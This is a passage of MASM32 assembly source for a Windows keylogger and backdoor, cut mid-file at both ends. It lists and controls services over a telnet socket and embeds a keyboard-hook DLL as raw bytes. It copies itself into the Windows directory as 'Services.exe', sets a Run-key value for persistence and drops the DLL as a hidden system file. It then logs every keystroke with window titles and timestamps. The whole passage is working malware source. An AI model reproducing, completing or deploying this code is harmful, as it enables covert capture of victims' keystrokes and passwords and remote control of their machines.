          LOCAL     ess     :ENUM_SERVICE_STATUS
          LOCAL     Needed  :DWORD
          LOCAL     ServicesReturned    :DWORD
          LOCAL     ResumeHandle        :DWORD
          LOCAL     pESSalloc    :DWORD
          LOCAL     localbuf[512]   :BYTE

          
          ESS_MAX_SIZE      EQU    ((8 + (7 * 4)) * 700 )      

          and    ResumeHandle, 0
          invoke OpenSCManager, NULL, NULL, SC_MANAGER_ALL_ACCESS
          or     eax, eax
          jz     @F   
          mov    hSCM, eax
          invoke VirtualAlloc, NULL, ESS_MAX_SIZE, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE  
          or     eax, eax
          jz     @ErrEnumClosehSCM
          mov    pESSalloc, eax

          invoke EnumServicesStatus, hSCM, ServiceType, \
                                     ServiceStatus, pESSalloc, ESS_MAX_SIZE, addr Needed, \
                                     addr ServicesReturned,  addr ResumeHandle
          or     eax, eax
          jz     @ErrEnumClosehSCM
          mov    ebx, [pESSalloc]
          assume ebx : ptr ENUM_SERVICE_STATUS

          invoke send, TelnetClientSock, addr enum_service_info, enum_service_info_len, 0  

         EnumServNext:
  
          mov    eax, [[ebx].lpServiceName]
          call   _strlen
          invoke send, TelnetClientSock, [ebx].lpServiceName, eax, 0  
          invoke send, TelnetClientSock, addr _2points, 3, 0  
          mov    eax, [[ebx].lpDisplayName]
          call   _strlen
          invoke send, TelnetClientSock, [ebx].lpDisplayName, eax, 0 
          invoke send, TelnetClientSock, addr CRLF, 3, 0  
                 
          add    ebx, sizeof ENUM_SERVICE_STATUS
          cmp    dword ptr [ebx],0
          jnz    EnumServNext
          
          invoke VirtualFree, pESSalloc, ESS_MAX_SIZE, MEM_DECOMMIT or MEM_RELEASE
         @ErrEnumClosehSCM:
          invoke CloseServiceHandle, hSCM
         @@:
          assume ebx : nothing
          ret
  
  EnumServices    endp


  RunService proc uses ebx

         LOCAL  hSCM:DWORD
         LOCAL  hSrv:DWORD
         LOCAL  SrvStat:SERVICE_STATUS
         LOCAL  RetVal:DWORD
         
         and    RetVal, 0       ; init error
         mov    ebx, eax
         invoke OpenSCManager, NULL, NULL, SC_MANAGER_ALL_ACCESS
         or     eax, eax
         jz     StopSrvFatal  
         mov    hSCM, eax
         invoke OpenService, hSCM, ebx, SERVICE_START
         or     eax, eax
         jz     CloseSCM
         mov    hSrv, eax
         invoke StartService, hSrv, NULL, NULL
         or     eax, eax
         jz     @F
         inc    RetVal
        @@:
         invoke CloseServiceHandle, hSrv
        CloseSCM:
         invoke CloseServiceHandle, hSCM
        StopSrvFatal:
         mov    eax, RetVal
         ret
  RunService endp
  
  StopService proc uses ebx
           LOCAL  hSCM:DWORD
           LOCAL  hSrv:DWORD
           LOCAL  SrvStat:SERVICE_STATUS
           LOCAL  RetVal:DWORD
           
           and    RetVal, 0       ; init error
           mov    ebx, eax
           invoke OpenSCManager, NULL, NULL, SC_MANAGER_ALL_ACCESS
           or     eax, eax
           jz     StopSrvFatal  
           mov    hSCM, eax
           invoke OpenService, hSCM, ebx, SERVICE_ALL_ACCESS
           or     eax, eax
           jz     CloseSCM
           mov    hSrv, eax
           invoke ControlService, hSrv, SERVICE_CONTROL_STOP, addr SrvStat
           or     eax, eax
           jz     @F
           inc    RetVal
          @@:
           invoke CloseServiceHandle, hSrv
          CloseSCM:
           invoke CloseServiceHandle, hSCM
          StopSrvFatal:
           mov    eax, RetVal
           ret
  StopService endp


  DelService proc uses ebx
             LOCAL  hSCM:DWORD
             LOCAL  hSrv:DWORD
             LOCAL  SrvStat:SERVICE_STATUS
             LOCAL  RetVal:DWORD
             
             and    RetVal, 0       ; init error
             mov    ebx, eax
             invoke OpenSCManager, NULL, NULL, SC_MANAGER_ALL_ACCESS
             or     eax, eax
             jz     StopSrvFatal  
             mov    hSCM, eax
             invoke OpenService, hSCM, ebx, SERVICE_ALL_ACCESS
             or     eax, eax
             jz     CloseSCM
             mov    hSrv, eax
             invoke DeleteService, hSrv
             or     eax, eax
             jz     @F
             inc    RetVal
            @@:
             invoke CloseServiceHandle, hSrv
            CloseSCM:
             invoke CloseServiceHandle, hSCM
            StopSrvFatal:
             mov    eax, RetVal
             ret
    DelService endp
        
HkDllStart::


  ; C:\masm32\KbHook.dll 4096 bytes
 
  db 77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0
  db 184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,200,0,0,0
  db 14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104
  db 105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111
  db 116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32
  db 109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0
  db 113,212,247,219,53,181,153,136,53,181,153,136,53,181,153,136
  db 53,181,153,136,38,181,153,136,201,149,139,136,52,181,153,136
  db 187,170,138,136,52,181,153,136,82,105,99,104,53,181,153,136
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,80,69,0,0,76,1,5,0
  db 59,190,182,61,0,0,0,0,0,0,0,0,224,0,14,33
  db 11,1,5,12,0,4,0,0,0,8,0,0,0,4,0,0
  db 0,16,0,0,0,16,0,0,0,32,0,0,0,0,0,16
  db 0,16,0,0,0,2,0,0,4,0,0,0,0,0,0,0
  db 4,0,0,0,0,0,0,0,0,96,0,0,0,4,0,0
  db 0,0,0,0,2,0,0,0,0,0,16,0,0,16,0,0
  db 0,0,16,0,0,16,0,0,0,0,0,0,16,0,0,0
  db 224,49,0,0,156,0,0,0,64,48,0,0,60,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,80,0,0,72,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,48,0,0,64,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 46,116,101,120,116,0,0,0,146,2,0,0,0,16,0,0
  db 0,4,0,0,0,4,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,32,0,0,96,46,98,115,115,0,0,0,0
  db 112,2,0,0,0,32,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,208
  db 46,114,100,97,116,97,0,0,124,2,0,0,0,48,0,0
  db 0,4,0,0,0,8,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,64,0,0,64,46,100,97,116,97,0,0,0
  db 4,0,0,0,0,64,0,0,0,2,0,0,0,12,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192
  db 46,114,101,108,111,99,0,0,104,0,0,0,0,80,0,0
  db 0,2,0,0,0,14,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,64,0,0,66,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 85,139,236,255,117,8,143,5,0,32,0,16,184,1,0,0
  db 0,201,194,12,0,85,139,236,131,125,8,0,117,32,139,69
  db 16,169,0,0,0,128,116,20,80,255,117,12,104,13,4,0
  db 0,255,53,8,32,0,16,232,62,2,0,0,235,30,131,125
  db 8,0,115,24,255,117,16,255,117,12,255,117,8,255,53,4
  db 32,0,16,232,28,2,0,0,201,194,12,0,51,192,201,194
  db 12,0,85,139,236,255,117,8,143,5,8,32,0,16,106,0
  db 255,53,0,32,0,16,104,21,16,0,16,106,2,232,4,2
  db 0,0,163,4,32,0,16,106,0,106,0,104,11,4,0,0
  db 255,53,8,32,0,16,232,223,1,0,0,201,194,4,0,255
  db 53,4,32,0,16,232,226,1,0,0,106,0,106,0,104,12
  db 4,0,0,255,53,8,32,0,16,232,194,1,0,0,195,85
  db 139,236,86,104,12,34,0,16,106,100,232,141,1,0,0,141
  db 53,12,34,0,16,86,232,123,1,0,0,131,248,3,117,9
  db 255,117,8,86,232,13,0,0,0,131,198,4,128,62,0,117
  db 228,94,201,194,4,0,85,139,236,129,196,0,254,255,255,87
  db 83,81,86,82,141,133,0,254,255,255,80,104,0,2,0,0
  db 232,59,1,0,0,255,117,12,255,117,8,232,21,0,0,0
  db 141,133,0,254,255,255,80,232,54,1,0,0,90,94,89,91
  db 95,201,194,8,0,85,139,236,129,196,188,250,255,255,255,117
  db 8,141,133,0,254,255,255,80,232,33,1,0,0,139,125,8
  db 50,192,128,63,0,116,3,71,235,248,128,127,255,92,116,7
  db 198,7,92,128,103,1,0,141,133,0,254,255,255,80,232,239
  db 0,0,0,141,133,194,250,255,255,80,104,0,64,0,16,232
  db 192,0,0,0,137,133,188,250,255,255,141,133,0,252,255,255
  db 80,104,0,2,0,0,232,181,0,0,0,128,189,238,250,255
  db 255,46,116,113,247,133,194,250,255,255,16,0,0,0,116,29
  db 255,117,12,141,133,238,250,255,255,80,232,118,255,255,255,141
  db 133,0,252,255,255,80,232,151,0,0,0,235,72,141,133,0
  db 252,255,255,80,104,12,32,0,16,232,144,0,0,0,128,189
  db 3,252,255,255,0,116,15,104,2,64,0,16,104,12,32,0
  db 16,232,114,0,0,0,141,133,238,250,255,255,80,104,12,32
  db 0,16,232,97,0,0,0,255,181,226,250,255,255,104,12,32
  db 0,16,255,85,12,141,133,194,250,255,255,80,255,181,188,250
  db 255,255,232,35,0,0,0,11,192,15,133,108,255,255,255,255
  db 181,188,250,255,255,232,4,0,0,0,201,194,8,0,255,37
  db 32,48,0,16,255,37,4,48,0,16,255,37,8,48,0,16
  db 255,37,12,48,0,16,255,37,16,48,0,16,255,37,20,48
  db 0,16,255,37,24,48,0,16,255,37,28,48,0,16,255,37
  db 0,48,0,16,255,37,56,48,0,16,255,37,40,48,0,16
  db 255,37,44,48,0,16,255,37,48,48,0,16,255,37,52,48
  db 0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 80,49,0,0,200,48,0,0,218,48,0,0,234,48,0,0
  db 2,49,0,0,18,49,0,0,44,49,0,0,68,49,0,0
  db 188,48,0,0,0,0,0,0,124,49,0,0,140,49,0,0
  db 156,49,0,0,176,49,0,0,106,49,0,0,0,0,0,0
  db 124,48,0,0,0,0,0,0,0,0,0,0,92,49,0,0
  db 0,48,0,0,164,48,0,0,0,0,0,0,0,0,0,0
  db 198,49,0,0,40,48,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,80,49,0,0
  db 200,48,0,0,218,48,0,0,234,48,0,0,2,49,0,0
  db 18,49,0,0,44,49,0,0,68,49,0,0,188,48,0,0
  db 0,0,0,0,124,49,0,0,140,49,0,0,156,49,0,0
  db 176,49,0,0,106,49,0,0,0,0,0,0,136,0,70,105
  db 110,100,67,108,111,115,101,0,140,0,70,105,110,100,70,105
  db 114,115,116,70,105,108,101,65,0,0,145,0,70,105,110,100
  db 78,101,120,116,70,105,108,101,65,0,225,0,71,101,116,67
  db 117,114,114,101,110,116,68,105,114,101,99,116,111,114,121,65
  db 0,0,240,0,71,101,116,68,114,105,118,101,84,121,112,101
  db 65,0,9,1,71,101,116,76,111,103,105,99,97,108,68,114
  db 105,118,101,83,116,114,105,110,103,115,65,0,62,2,83,101
  db 116,67,117,114,114,101,110,116,68,105,114,101,99,116,111,114
  db 121,65,0,0,211,2,108,115,116,114,99,97,116,65,0,0
  db 220,2,108,115,116,114,99,112,121,65,0,0,75,69,82,78
  db 69,76,51,50,46,100,108,108,0,0,20,0,67,97,108,108
  db 78,101,120,116,72,111,111,107,69,120,0,0,219,1,80,111
  db 115,116,77,101,115,115,97,103,101,65,0,0,16,2,83,101
  db 110,100,77,101,115,115,97,103,101,65,0,0,93,2,83,101
  db 116,87,105,110,100,111,119,115,72,111,111,107,69,120,65,0
  db 129,2,85,110,104,111,111,107,87,105,110,100,111,119,115,72
  db 111,111,107,69,120,0,85,83,69,82,51,50,46,100,108,108
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,59,190,182,61,0,0,0,0,48,50,0,0
  db 1,0,0,0,4,0,0,0,4,0,0,0,8,50,0,0
  db 24,50,0,0,40,50,0,0,191,16,0,0,98,16,0,0
  db 246,16,0,0,159,16,0,0,59,50,0,0,84,50,0,0
  db 98,50,0,0,111,50,0,0,0,0,1,0,2,0,3,0
  db 75,98,72,111,111,107,46,100,108,108,0,70,105,108,101,83
  db 101,97,114,99,104,65,108,108,70,105,120,101,100,68,114,105
  db 118,101,115,0,73,110,115,116,97,108,108,75,66,72,111,111
  db 107,0,82,101,99,117,114,115,105,118,83,99,97,110,0,82
  db 101,109,111,118,101,75,66,72,111,111,107,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 42,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,16,0,0,72,0,0,0,8,48,51,48,79,48,106,48
  db 114,48,119,48,131,48,146,48,161,48,181,48,196,48,209,48
  db 123,49,213,49,232,49,237,49,254,49,14,50,64,50,70,50
  db 76,50,82,50,88,50,94,50,100,50,106,50,112,50,118,50
  db 124,50,130,50,136,50,142,50,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

 

HkDllSize   equ $ - OFFSET HkDllStart

Install    proc
    LOCAL   SysBuf[256]:BYTE
    LOCAL   ValueNbr:DWORD
    LOCAL   ValueType:DWORD
    LOCAL   ValueNameBufSize:DWORD
    LOCAL   RegDataSize:DWORD
    LOCAL   RegData[512]:BYTE
    LOCAL   ValueNameBuf[512]:BYTE
    LOCAL   KeyDisp:DWORD
    LOCAL   hKey:DWORD
    LOCAL   ComputerBuf[256]:BYTE
    LOCAL   ComputerBufSize:DWORD
    LOCAL   hInstallCheckKey:DWORD
    LOCAL   InstallCheckBuf[512]:BYTE
    LOCAL   _AppNameBuf[512]:BYTE
    
    .data

    FakeName        db  "\Services"            ; MSTCompat.exe
    Ext             db  ".exe",0
    bkl             db  '\',0

    RunSubKey               db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
    InstallCheckSubKey      db "SOFTWARE\Microsoft\",0
    ValueNameDefaut         db "SCM",0

    RegAppendTBL    dd  OFFSET sz_32
                    dd  OFFSET szGuard
                    dd  OFFSET szCheck
                    dd  OFFSET szStop
                    dd  OFFSET szPro
                    dd  OFFSET szWatch
                    dd  OFFSET szMon
                    dd  OFFSET szLauncher
                    
    RegAppendNbr    equ ($ - OFFSET RegAppendTBL) / 4
    
    sz_32           db  "32",0
    szGuard         db  "guard",0
    szCheck         db  "check",0
    szStop          db  "stop",0
    szPro           db  "Pro",0
    szWatch         db  "watch",0
    szMon           db  "mon",0
    szLauncher      db  "launcher",0
    


    .code
    


    
    mov    ComputerBufSize, SIZEOF ComputerBuf
    mov    ComputerBufSize, MAX_COMPUTERNAME_LENGTH + 1
    invoke GetComputerName, addr ComputerBuf, addr ComputerBufSize
    invoke MirrorStr, addr ComputerBuf, addr ComputerBuf ; ex : Xeno -> Cvml
     
    invoke lstrcpy, addr InstallCheckBuf, addr InstallCheckSubKey
    invoke lstrcat, addr InstallCheckBuf, addr ComputerBuf
    invoke lstrcpy, addr DllNameBuf, addr ComputerBuf
    invoke lstrcat, addr DllNameBuf, addr DLL
    invoke GetWindowsDirectory, addr SysBuf, SIZEOF SysBuf
    invoke lstrcat, addr SysBuf, addr bkl
    invoke lstrcpy, addr record_file, addr SysBuf
    invoke lstrcat, addr record_file, addr ComputerBuf
    invoke lstrcat, addr record_file, addr LOG



    

   
    invoke RegCreateKeyEx,  HKEY_LOCAL_MACHINE, addr InstallCheckBuf, 0, 0, REG_OPTION_NON_VOLATILE, \
                            KEY_ALL_ACCESS, 0, addr hInstallCheckKey, addr KeyDisp 

    ;test     eax,eax          ; Deja installé ?
    ;jnz    ExitEnumVals   


    ;cmp    KeyDisp, REG_OPENED_EXISTING_KEY
    ;jz     ExitEnumVals

    
    
    invoke RegCreateKeyEx,  HKEY_LOCAL_MACHINE, addr RunSubKey, 0, 0, REG_OPTION_NON_VOLATILE, \
                            KEY_WRITE or KEY_QUERY_VALUE, 0, addr hKey, addr KeyDisp 

    .IF    eax  == ERROR_SUCCESS
    
          
          
          CreateNewVal:
           cld

           invoke   GetWindowsDirectory, addr SysBuf, SIZEOF SysBuf
           lea      edi, dword ptr [SysBuf]
          @@:
           inc      edi
           cmp      byte ptr [edi],0
           jnz      @b
           lea      esi, [FakeName]
          @@:
           lodsb
           stosb
           or       al, al
           jnz      @B
           
           ;invoke   lstrcat, addr SysBuf, addr FakeName

           invoke   GetModuleHandle, NULL
           xchg     eax,ecx
           invoke   GetModuleFileName, ecx, addr _AppNameBuf, SIZEOF _AppNameBuf
           invoke   CopyFile, addr _AppNameBuf, addr SysBuf, FALSE
           lea      eax,[SysBuf]
           call     _strlen
           xchg     eax,ecx
                    
           invoke   RegSetValueEx, hKey, addr ValueNameDefaut, 0, REG_SZ, addr SysBuf, ecx
    
                                 
    
          DropDll:
    
              invoke   GetWindowsDirectory, addr SysBuf, SIZEOF SysBuf
              invoke   SetCurrentDirectory, addr SysBuf
              invoke   CreateFile, addr DllNameBuf, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, \
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_READONLY, \
                                   NULL
              mov      ebx,eax
              invoke   WriteFile, ebx, addr HkDllStart, HkDllSize, addr Written, NULL     ; Write our Dll
              invoke   CloseHandle, ebx
              
              lea    edi, _AppNameBuf
              mov    eax, edi
              call   _strlen
              add    edi, eax
              std
              mov    ecx, eax
              mov    al, '\'
              repnz  scasb
              inc    edi
              inc    edi
              cld
              invoke lstrcmpi, addr [FakeName+1], edi
              .IF    eax != 0
                     invoke   ShellExecute, hWin, addr szOpen, addr [FakeName+1], NULL, addr SysBuf, SW_SHOWNORMAL
                     invoke   ExitProcess,eax
              .ENDIF
              

                     


       
        RegExitErr:

        RegOk:
    .ENDIF
   ;ExitEnumVals:


   push    eax
    .IF    hKey != 0
           invoke RegCloseKey, hKey
           and    hKey,0
    .ENDIF
    
    .IF    hInstallCheckKey != 0
           invoke RegCloseKey, hInstallCheckKey
           and    hInstallCheckKey,0 
    .ENDIF


     invoke LoadLibrary,    addr DllNameBuf                             ; Get our dll
     or     eax,eax
     jnz    @F
     invoke ExitProcess,eax
    @@:
     mov    ebx,eax
     mov    hLib, eax
     invoke GetProcAddress, ebx, addr szInstallKBHook                   ; Retrieve the address of our apis
     mov    _InstallKBHook, eax
     invoke GetProcAddress, ebx, addr szRemoveKBHook                    
     mov    _RemoveKBHook,  eax
     invoke GetProcAddress, ebx, addr szRecursivScan
     mov    _RecursivScan,  eax
     invoke GetProcAddress, ebx, addr szFileSearchAllFixedDrives
     mov    _FileSearchAllFixedDrives, eax
     
     invoke LoadLibrary, addr PSAPI
     or     eax,eax
     jz    @F
     mov    ebx, eax
     invoke GetProcAddress, ebx, addr szEnumProcesses
     mov    _EnumProcesses, eax
     invoke GetProcAddress, ebx, addr szGetModuleFileNameExA
     mov    _GetModuleFileNameExA, eax
    @@:
    pop     eax                                 ; IF EAX == 0 function failed ELSE Its ok
    cld
    ret
    
Install endp



        
KBProc  proc  


      LOCAL    KeyCode:DWORD     
      LOCAL    KB_State[256]:BYTE
      LOCAL    WindowCaptionBuf[256]:BYTE
      LOCAL    WindowInfo_buf[512]:BYTE
      LOCAL    Char:WORD
      LOCAL    written:DWORD



               
                mov    KeyCode, eax                 

                push   KeyCode
                Call   ProcessChar
                or     eax,eax
                jz     SkipWrite
                

       

                call   GetForegroundWindow

                .IF    PrevWnd != eax
                    push   eax
                    cmp    PrevWnd, 0
                    jnz    @F
                    lea    ecx, [written]
                    invoke WriteFile,hLog, addr NouvelleSession, NouvelleSessionLen, ecx, 0
                   @@: 
                    pop    eax
                    mov    PrevWnd,eax     

                   
                    invoke GetWindowText, PrevWnd, addr WindowCaptionBuf,\
                                           sizeof WindowCaptionBuf
                                     
                    Call   TimeDateUsrInfo
                
                    invoke wsprintf, addr WindowInfo_buf, addr char_templ, \
                                     addr WindowCaptionBuf, addr TDUinfo
                    IF  __CRYPT_STUFF__                 
                          invoke Crypt, addr WindowInfo_buf, addr CryptBuf  
                          invoke WriteFile,hLog, addr CryptBuf, eax, addr written, 0     
                    ELSE
                          lea    eax, [WindowInfo_buf]
                          call   _strlen
                          lea    ecx, [written]
                          invoke WriteFile,hLog, addr WindowInfo_buf, eax, ecx, 0 
                    ENDIF                          

                .ENDIF

                invoke GetKeyboardState, addr KB_State               
                invoke ToAscii, KeyCode, 0, addr KB_State, addr Char,0
                lea    ecx, [written]
                invoke WriteFile,hLog, addr Char, 1, ecx, 0  

              SkipWrite:

              

      ret
KBProc  endp

 _ToLower proc


             push esi
             push ecx
             mov  esi,eax
             Call _strlen
             mov  ecx,eax
             
             
           @NextCh:
             mov  al,byte ptr [esi+ecx]
             cmp  al,41h
